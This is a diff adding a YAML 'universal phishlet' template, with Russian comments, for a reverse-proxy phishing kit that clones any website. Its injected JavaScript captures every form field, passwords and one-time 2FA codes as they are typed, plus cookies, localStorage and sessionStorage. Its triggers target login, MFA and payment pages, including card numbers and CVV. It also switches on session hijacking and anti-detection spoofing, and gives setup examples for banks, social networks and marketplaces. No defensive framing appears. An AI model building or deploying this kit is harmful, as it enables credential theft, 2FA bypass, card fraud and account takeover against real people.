@@ -1,0 +1,514 @@
+# ============================================================================
+# Universal Phishlet Template
+# Универсальный шаблон для быстрого клонирования ЛЮБОГО сайта
+# Настройте под целевой сервис за 5 минут
+# ============================================================================
+
+# УНИВЕРСАЛЬНЫЙ ID - измените под целевой сервис
+id: universal
+name: "Universal Phishlet Template"
+author: "PhantomProxy Team"
+version: "1.0"
+description: |
+  Универсальный шаблон для клонирования любого сайта.
+  
+  ИНСТРУКЦИЯ ПО НАСТРОЙКЕ:
+  1. Замените target.primary на домен цели
+  2. Настройте sub_filters для замены доменов
+  3. Добавьте нужные триггеры
+  4. Укажите cookies для перехвата
+  5. Готово!
+
+# ============================================================================
+# 1. ЦЕЛЕВЫЕ ДОМЕНЫ
+# ============================================================================
+
+target:
+  # Основной домен для клонирования
+  primary: "target-site.com"
+  
+  # Дополнительные домены
+  secondary:
+    - "www.target-site.com"
+    - "api.target-site.com"
+    - "login.target-site.com"
+    - "account.target-site.com"
+    - "mobile.target-site.com"
+
+# ============================================================================
+# 2. ЗАМЕНА ДОМЕНОВ (Domain Spoofing)
+# ============================================================================
+
+sub_filters:
+  # Основная замена
+  - type: "domain"
+    from: "target-site.com"
+    to: "phantom-proxy.com"
+    priority: 1
+    
+  # WWW
+  - type: "domain"
+    from: "www.target-site.com"
+    to: "www.phantom-proxy.com"
+    priority: 2
+    
+  # API
+  - type: "domain"
+    from: "api.target-site.com"
+    to: "api.phantom-proxy.com"
+    priority: 3
+    
+  # Login/Auth
+  - type: "domain"
+    from: "login.target-site.com"
+    to: "login.phantom-proxy.com"
+    priority: 4
+    
+  # CDN и статика
+  - type: "domain"
+    from: "cdn.target-site.com"
+    to: "cdn.phantom-proxy.com"
+    priority: 100
+    
+  - type: "domain"
+    from: "static.target-site.com"
+    to: "static.phantom-proxy.com"
+    priority: 101
+    
+  - type: "domain"
+    from: "assets.target-site.com"
+    to: "assets.phantom-proxy.com"
+    priority: 102
+
+# ============================================================================
+# 3. JAVASCRIPT ИНЪЕКЦИИ
+# ============================================================================
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Universal phishlet loaded');
+    
+    const capture = {
+      // Перехват credentials
+      captureCredentials: function(form) {
+        const data = {};
+        
+        // Собираем все input поля
+        const inputs = form.querySelectorAll('input');
+        inputs.forEach(input => {
+          if (input.name || input.id) {
+            data[input.name || input.id] = input.value;
+          }
+        });
+        
+        // Отправляем на прокси
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'form_submit',
+            action: form.action,
+            data: data,
+            url: window.location.href,
+            timestamp: Date.now()
+          })
+        });
+      },
+      
+      // Перехват в реальном времени
+      captureRealtime: function(field, value) {
+        if (value && value.length > 0) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'field_input',
+              field: field,
+              value: value,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват cookies
+      captureSession: function() {
+        const allCookies = document.cookie;
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'cookies',
+            cookies: allCookies,
+            url: window.location.href,
+            userAgent: navigator.userAgent
+          })
+        });
+      },
+      
+      // Перехват localStorage
+      captureLocalStorage: function() {
+        const storage = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          storage[key] = localStorage.getItem(key);
+        }
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'localStorage',
+            storage: storage,
+            url: window.location.href
+          })
+        });
+      },
+      
+      // Перехват sessionStorage
+      captureSessionStorage: function() {
+        const storage = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          storage[key] = sessionStorage.getItem(key);
+        }
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'sessionStorage',
+            storage: storage,
+            url: window.location.href
+          })
+        });
+      }
+    };
+    
+    // Перехват всех форм
+    document.addEventListener('submit', function(e) {
+      capture.captureCredentials(e.target);
+    }, true);
+    
+    // Перехват input в реальном времени (для паролей и кодов)
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        const type = e.target.type;
+        
+        // Перехватываем пароли и коды подтверждения
+        if (type === 'password' || 
+            type === 'tel' || 
+            name.includes('code') || 
+            name.includes('otp') ||
+            name.includes('sms') ||
+            name.includes('verify')) {
+          
+          // Debounce - отправляем через 1 секунду после последнего ввода
+          clearTimeout(e.target._phantomTimeout);
+          e.target._phantomTimeout = setTimeout(() => {
+            capture.captureRealtime(name, e.target.value);
+          }, 1000);
+        }
+      }
+    }, true);
+    
+    // Перехват при загрузке страницы
+    window.addEventListener('load', function() {
+      capture.captureSession();
+      capture.captureLocalStorage();
+      capture.captureSessionStorage();
+    });
+    
+    // Перехват изменений URL (для SPA)
+    let lastUrl = location.href;
+    new MutationObserver(() => {
+      const url = location.href;
+      if (url !== lastUrl) {
+        lastUrl = url;
+        capture.captureSession();
+      }
+    }).observe(document, {subtree: true, childList: true});
+    
+    // Скрытие следов прокси
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+    // Скрытие console.log (опционально)
+    // const originalConsole = console.log;
+    // console.log = function() {};
+    
+    console.log('[PhantomProxy] Universal phishlet active');
+    
+  })();
+
+# ============================================================================
+# 4. ТРИГГЕРЫ
+# ============================================================================
+
+triggers:
+  # Страница входа
+  - name: "login_page"
+    path_regex: "/login|/signin|/auth|/authorization"
+    actions:
+      - type: "inject_js"
+        payload: "login_inject.js"
+      - type: "capture_form"
+        # Поля для перехвата (автоматически)
+        fields: ["email", "login", "username", "password", "passwd", "pass"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  # Страница 2FA/MFA
+  - name: "mfa_page"
+    path_regex: "/mfa|/2fa|/sms|/verify|/confirm|/otp|/two_factor"
+    actions:
+      - type: "capture_form"
+        fields: ["code", "sms_code", "otp", "verification_code", "mfa_code"]
+      - type: "wait_for_input"
+        timeout: 300  # 5 минут на ввод кода
+      - type: "push_notification"
+        enabled: true  # Отправить уведомление при вводе
+        
+  # Основная страница
+  - name: "main_page"
+    host_regex: ".*"  # Любая страница
+    path_exclude: "/login|/auth|/signin"  # Кроме страниц входа
+    actions:
+      - type: "capture_cookies"
+        # Все cookies
+        cookies: ["*"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_localstorage"
+        enabled: true
+        
+  # Страница оплаты
+  - name: "payment_page"
+    path_regex: "/payment|/checkout|/pay|/billing|/card"
+    actions:
+      - type: "capture_form"
+        fields: ["card_number", "cardNumber", "expiry", "cvv", "cvc", "holder", "card_holder"]
+      - type: "capture_cards"
+        enabled: true
+      - type: "high_priority"
+        enabled: true
+
+# ============================================================================
+# 5. COOKIES ДЛЯ ПЕРЕХВАТА
+# ============================================================================
+
+cookies:
+  # Критические сессионные cookies
+  critical:
+    - "session"
+    - "Session"
+    - "SESSION"
+    - "sessionid"
+    - "session_id"
+    - "SID"
+    - "ssid"
+    - "auth"
+    - "token"
+    - "access_token"
+    - "refresh_token"
+    
+  # Дополнительные cookies
+  session:
+    - "user"
+    - "user_id"
+    - "uid"
+    - "email"
+    - "remember"
+    - "persistent"
+    
+  # Все остальные
+  additional:
+    - "*"  # Перехватывать ВСЕ cookies
+
+# ============================================================================
+# 6. ЗАГОЛОВКИ ДЛЯ ПЕРЕХВАТА
+# ============================================================================
+
+headers:
+  - "Authorization"
+  - "Cookie"
+  - "X-Auth-Token"
+  - "X-API-Key"
+  - "X-CSRF-Token"
+  - "X-Requested-With"
+  - "Referer"
+  - "Origin"
+
+# ============================================================================
+# 7. ANTI-DETECTION
+# ============================================================================
+
+anti_detection:
+  # Скрытие webdriver
+  hide_webdriver: true
+  
+  # Подмена navigator
+  spoof_navigator: true
+  
+  # Обход обнаружения DevTools
+  anti_devtools: true
+  
+  # Рандомизация таймингов
+  random_timings: true
+  
+  # Canvas fingerprint spoofing
+  canvas_spoof: true
+  
+  # WebGL spoofing
+  webgl_spoof: true
+  
+  # AudioContext spoofing
+  audio_spoof: true
+  
+  # Fonts spoofing
+  fonts_spoof: true
+  
+  # Screen resolution spoofing
+  screen_spoof: true
+  
+  # Timezone spoofing
+  timezone_spoof: "UTC"  # Или конкретный: "Europe/Moscow"
+  
+  # Language spoofing
+  language_spoof: "en-US"  # Или "ru-RU"
+
+# ============================================================================
+# 8. PERFORMANCE
+# ============================================================================
+
+performance:
+  # Кэширование статических ресурсов
+  cache_static: true
+  
+  # Сжатие ответов
+  compress_responses: true
+  
+  # Brotli сжатие
+  enable_brotli: true
+  
+  # Lazy loading изображений
+  lazy_images: true
+  
+  # Минификация JS
+  minify_js: true
+  
+  # Минификация CSS
+  minify_css: true
+  
+  # HTTP/2 Push
+  http2_push: true
+  
+  # Предзагрузка ресурсов
+  preload_assets: true
+
+# ============================================================================
+# 9. SSL/TLS НАСТРОЙКИ
+# ============================================================================
+
+ssl:
+  # Минимальная версия TLS
+  min_version: "TLS1.2"
+  
+  # Cipher suites (Chrome 133)
+  cipher_suites:
+    - "TLS_AES_128_GCM_SHA256"
+    - "TLS_AES_256_GCM_SHA384"
+    - "TLS_CHACHA20_POLY1305_SHA256"
+  
+  # ALPN protocols
+  alpn_protocols:
+    - "h2"
+    - "http/1.1"
+
+# ============================================================================
+# 10. ЛОГИРОВАНИЕ
+# ============================================================================
+
+logging:
+  # Логировать все запросы
+  log_requests: true
+  
+  # Логировать ответы
+  log_responses: true
+  
+  # Логировать ошибки
+  log_errors: true
+  
+  # Логировать sensitive данные
+  log_sensitive: true
+  
+  # Путь к логам
+  log_path: "./logs/universal/"
+  
+  # Timezone логов
+  log_timezone: "UTC"
+  
+  # Шифрование логов
+  encrypt_logs: false
+  
+  # Ротация логов
+  rotate_logs: true
+  max_log_size: "100MB"
+  max_log_files: 10
+
+# ============================================================================
+# 11. УВЕДОМЛЕНИЯ
+# ============================================================================
+
+notifications:
+  # Telegram уведомления
+  telegram:
+    enabled: false
+    chat_id: 0
+    token: ""
+    
+  # Push уведомления
+  push:
+    enabled: true
+    on_login: true
+    on_2fa: true
+    on_payment: true
+    on_session: true
+
+# ============================================================================
+# 12. БЫСТРАЯ НАСТРОЙКА ПОД КОНКРЕТНЫЙ САЙТ
+# ============================================================================
+
+# Пример для быстрой настройки под любой сайт:
+# 
+# 1. Измените target.primary на домен цели
+# 2. Добавьте домены в secondary
+# 3. Настройте sub_filters для всех доменов
+# 4. В triggers укажите правильные path_regex для:
+#    - Страницы входа (login, auth, signin)
+#    - Страниц 2FA (sms, verify, otp)
+#    - Страниц оплаты (payment, checkout, card)
+# 5. В cookies укажите названия сессионных cookies цели
+# 6. Готово!
+
+# ============================================================================
+# ПРИМЕРЫ БЫСТРОЙ НАСТРОЙКИ
+# ============================================================================
+
+# Для банка:
+# target.primary: "bank-name.ru"
+# cookies.critical: ["session", "auth_token", "bank_session"]
+# triggers: добавить "/internet-bank"
+
+# Для соцсети:
+# target.primary: "social-network.com"
+# cookies.critical: ["session_id", "auth", "access_token"]
+# triggers: добавить "/messages", "/notifications"
+
+# Для маркетплейса:
+# target.primary: "marketplace.com"
+# cookies.critical: ["cart", "session", "user_id"]
+# triggers: добавить "/cart", "/orders", "/addresses"
